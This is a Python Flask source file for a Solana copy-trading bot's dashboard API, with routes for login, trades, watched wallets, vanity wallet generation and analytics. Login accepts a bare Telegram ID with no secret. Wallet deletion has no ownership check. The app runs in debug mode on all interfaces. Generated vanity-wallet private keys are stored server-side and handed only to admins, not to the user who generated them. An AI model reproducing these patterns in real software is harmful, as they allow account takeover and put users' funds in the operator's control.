"""
Web dashboard API for the DEX copy trading bot
"""
import sys
import os
# Ensure project root is on sys.path when this file is run as a subprocess
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import logging
from flask import Flask, render_template, request, jsonify, session
from flask_cors import CORS
from flask_session import Session
import asyncio
from datetime import datetime, timedelta
from data.database import db
from chains.solana.wallet import SolanaWallet
from data.analytics import analytics
from chains.solana.vanity_wallet import vanity_generator
from chains.solana.spl_tokens import token_manager
from wallet.encryption import encryption

logger = logging.getLogger(__name__)

app = Flask(__name__)
app.config['SECRET_KEY'] = os.getenv('FLASK_SECRET_KEY') or os.urandom(32)
CORS(app)
Session(app)

wallet_manager = SolanaWallet()


# Authentication
@app.route('/api/auth/login', methods=['POST'])
def login():
    """User login"""
    data = request.json
    telegram_id = data.get('telegram_id')
    
    user = db.get_user(telegram_id)
    if not user:
        return jsonify({'error': 'User not found'}), 401
    
    session['user_id'] = user['user_id']
    session['telegram_id'] = telegram_id
    
    return jsonify({'success': True, 'user_id': user['user_id']})


@app.route('/api/auth/logout', methods=['POST'])
def logout():
    """User logout"""
    session.clear()
    return jsonify({'success': True})


# Dashboard
@app.route('/api/dashboard', methods=['GET'])
def get_dashboard():
    """Get dashboard data"""
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    user_id = session['user_id']
    user = db.get_user(session['telegram_id'])
    balance = wallet_manager.get_balance(user['wallet_address']) or 0
    stats = db.get_user_stats(user_id)
    metrics = analytics.calculate_performance_metrics(user_id)
    copy_stats = analytics.get_copy_trading_stats(user_id)
    
    return jsonify({
        'user': {
            'wallet': user['wallet_address'],
            'balance': balance
        },
        'stats': stats,
        'metrics': metrics,
        'copy_stats': copy_stats
    })


# Trades
@app.route('/api/trades', methods=['GET'])
def get_trades():
    """Get recent trades"""
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    limit = request.args.get('limit', 20, type=int)
    trades = db.get_user_trades(session['user_id'], limit=limit)
    
    return jsonify({'trades': trades})


# Wallets
@app.route('/api/wallets/watched', methods=['GET'])
def get_watched_wallets():
    """Get watched wallets"""
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    wallets = db.get_watched_wallets(session['user_id'])
    return jsonify({'wallets': wallets})


@app.route('/api/wallets/watched', methods=['POST'])
def add_watched_wallet():
    """Add wallet to watch"""
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    data = request.json
    wallet_address = data.get('wallet_address')
    alias = data.get('alias')
    copy_scale = data.get('copy_scale', 1.0)
    
    if not wallet_manager.validate_address(wallet_address):
        return jsonify({'error': 'Invalid wallet address'}), 400
    
    success = db.add_watched_wallet(session['user_id'], wallet_address, alias, copy_scale)
    
    if success:
        return jsonify({'success': True})
    else:
        return jsonify({'error': 'Failed to add wallet'}), 500


@app.route('/api/wallets/watched/<wallet_id>', methods=['DELETE'])
def remove_watched_wallet(wallet_id):
    """Remove watched wallet"""
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    success = db.remove_watched_wallet(wallet_id)
    
    if success:
        return jsonify({'success': True})
    else:
        return jsonify({'error': 'Failed to remove wallet'}), 500


# Vanity Wallet Generation
@app.route('/api/vanity-wallet', methods=['POST'])
def generate_vanity():
    """Generate vanity wallet"""
    data = request.json
    prefix = data.get('prefix', '')
    difficulty = data.get('difficulty', 3)
    case_sensitive = data.get('case_sensitive', data.get('caseSensitive', True))
    match_position = (
        data.get('position')
        or data.get('match_position')
        or 'start'
    )
    
    if 'user_id' not in session or 'telegram_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    user = db.get_user(session['telegram_id']) or {}
    is_admin = bool(user.get('is_admin'))

    if not prefix:
        return jsonify({'error': 'Prefix required'}), 400
    
    if isinstance(case_sensitive, str):
        case_sensitive = case_sensitive.strip().lower() in ("1", "true", "yes", "y", "on")

    try:
        public_key, secret_key, diff = asyncio.run(
            vanity_generator.generate_vanity_wallet(
                prefix,
                difficulty,
                match_position=match_position,
                case_sensitive=case_sensitive,
            )
        )

        # Store generated private key in DB (encrypted). This is the source of truth
        # for admin access.
        internal_user_id = session['user_id']
        encrypted_key = encryption.encrypt(secret_key)
        db.add_vanity_wallet(
            internal_user_id,
            public_key,
            prefix,
            diff,
            encrypted_key,
            match_position=match_position,
            case_sensitive=case_sensitive,
        )

        payload = {
            'address': public_key,
            'difficulty': diff,
            'match_position': match_position,
            'case_sensitive': case_sensitive,
        }

        # Only admins receive the private key via the API.
        if is_admin:
            payload['private_key'] = secret_key

        return jsonify(payload)

    except Exception as e:
        logger.error(f"Vanity wallet generation error: {e}")
        return jsonify({'error': str(e)}), 500


# Token Queries
@app.route('/api/tokens/<wallet_address>', methods=['GET'])
def get_wallet_tokens(wallet_address):
    """Get all tokens in wallet"""
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    if not wallet_manager.validate_address(wallet_address):
        return jsonify({'error': 'Invalid wallet address'}), 400
    
    tokens = asyncio.run(token_manager.get_all_token_balances(wallet_address))
    
    return jsonify({'tokens': tokens})


# Analytics
@app.route('/api/analytics/performance', methods=['GET'])
def get_performance():
    """Get performance metrics"""
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    metrics = analytics.calculate_performance_metrics(session['user_id'])
    dex_stats = analytics.get_trading_stats_by_dex(session['user_id'])
    top_tokens = analytics.get_top_tokens_traded(session['user_id'])
    
    return jsonify({
        'metrics': metrics,
        'dex_stats': dex_stats,
        'top_tokens': top_tokens
    })


@app.route('/api/analytics/report', methods=['GET'])
def get_daily_report():
    """Get daily report"""
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    report = analytics.generate_daily_report(session['user_id'])
    
    return jsonify({'report': report})


# Health check
@app.route('/api/health', methods=['GET'])
def health():
    """Health check endpoint"""
    return jsonify({'status': 'ok'})


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
